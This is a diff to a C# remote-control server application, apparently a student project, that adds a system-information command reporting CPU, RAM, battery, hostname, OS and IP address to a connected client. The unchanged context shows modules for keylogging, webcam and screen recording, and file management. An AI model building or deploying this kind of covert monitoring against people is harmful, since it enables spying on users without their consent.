@@ -15,6 +15,7 @@ using System.Drawing.Imaging;
 using System.Threading;
 using KeyLogger;
 using System.Security;
+using System.Timers;
 namespace ServerApp
 {
     public partial class server : Form
@@ -24,11 +25,57 @@ namespace ServerApp
         Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI
         WebcamRecorder.WebcamCapture webcamCapture = null; // Instance cho Webcam
         ScreenRecorder.ScreenCapture screenCapture = null; // Instance cho Screen Recorder
+        
+        PerformanceCounter cpuCounter;
+        PerformanceCounter ramCounter;
+        System.Timers.Timer statsTimer;
+
+        string cachedSystemInfo = "0|0|Checking...|...|...|...";
+        String staticInfo = "";
+
         public server()
         {
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false; // Cho phép truy cập UI từ luồng khác (dùng cẩn thận)
             this.FormClosing += new FormClosingEventHandler(server_FormClosing);
+
+            // Khởi tạo Counter cho CPU và RAM
+            try
+            {
+                // Khởi tạo Counter (vẫn có thể gây delay nhẹ lúc bật app, nhưng chỉ 1 lần)
+                cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
+                ramCounter = new PerformanceCounter("Memory", "Available MBytes");
+
+                // Gọi lần đầu (thường trả về 0) để làm nóng Counter
+                cpuCounter.NextValue();
+
+                // Cấu hình Timer chạy mỗi 1000ms (1 giây)
+                statsTimer = new System.Timers.Timer(1000);
+                statsTimer.Elapsed += UpdateSystemStats; // Gán hàm xử lý
+                statsTimer.AutoReset = true;
+                statsTimer.Enabled = true; // Bắt đầu chạy ngay
+            }
+            catch { }
+
+            try
+            {
+                String hostname = Dns.GetHostName();
+                String os = Environment.OSVersion.ToString();
+                String ipAddr = "Unknown";
+                var host = Dns.GetHostEntry(hostname);
+                foreach (var ip in host.AddressList)
+                {
+                    if (ip.AddressFamily == AddressFamily.InterNetwork)
+                    {
+                        ipAddr = ip.ToString();
+                        break;
+                    }
+                }
+                // Lưu sẵn định dạng phần đuôi
+                staticInfo = $"|{hostname}|{os}|{ipAddr}";
+            }
+            catch { staticInfo = "|Unknown|Unknown|Unknown"; }
+
             // Xóa file log cũ khi khởi động lại server để tránh file bị phình to
             try
             {
@@ -104,6 +151,7 @@ namespace ServerApp
             String s = "";
             while (true)
             {
+                Console.WriteLine($"[Received] {DateTime.Now.Ticks} - {s}"); // In ra thời gian và lệnh nhận được
                 receiveSignal(ref s);
                 switch (s)
                 {
@@ -121,6 +169,7 @@ namespace ServerApp
                         FileManager fm = new FileManager();
                         fm.HandleFileCommand();
                         break;
+                    case "SYSTEM_INFO": send_system_info(); break;
                     case "QUIT": return;
                 }
             }
@@ -789,6 +838,49 @@ namespace ServerApp
                     case "QUIT": // Thoát module
                         return;
                 }
+            }
+        }
+
+        // --- MODULE SYSTEM INFO ---
+        private void UpdateSystemStats(Object source, ElapsedEventArgs e)
+        {
+            try
+            {
+                // 1. Vẫn giữ lại phần lấy CPU và RAM (vì số liệu này thay đổi liên tục)
+                float cpu = cpuCounter.NextValue();
+                float ram = ramCounter.NextValue();
+
+                // 2. Vẫn giữ phần lấy Pin (thao tác này nhanh, không sao)
+                String battery = "Unknown";
+                try
+                {
+                    PowerStatus pwr = SystemInformation.PowerStatus;
+                    battery = (pwr.BatteryLifePercent * 100).ToString() + "%";
+                    if (pwr.PowerLineStatus == PowerLineStatus.Online) battery += " (Plugged)";
+                }
+                catch { }
+
+                // 3. THAY ĐỔI LỚN Ở ĐÂY:
+                // Thay vì gọi lại Dns.GetHostEntry... ta chỉ cần ghép chuỗi với biến staticInfo đã tạo ở bước 2
+                cachedSystemInfo = $"{cpu:0.0}|{ram}|{battery}" + staticInfo;
+            }
+            catch { }
+        }
+
+        // --- 4. SỬA HÀM GỬI INFO (send_system_info) ---
+        // Hàm này giờ chỉ việc đọc cache -> Cực nhanh
+        public void send_system_info()
+        {
+            try
+            {
+                // Gửi ngay lập tức dữ liệu đã được Timer chuẩn bị sẵn
+                Program.nw.WriteLine(cachedSystemInfo);
+                Program.nw.Flush();
+            }
+            catch (Exception ex)
+            {
+                Program.nw.WriteLine("ERROR|" + ex.Message);
+                Program.nw.Flush();
             }
         }
     }
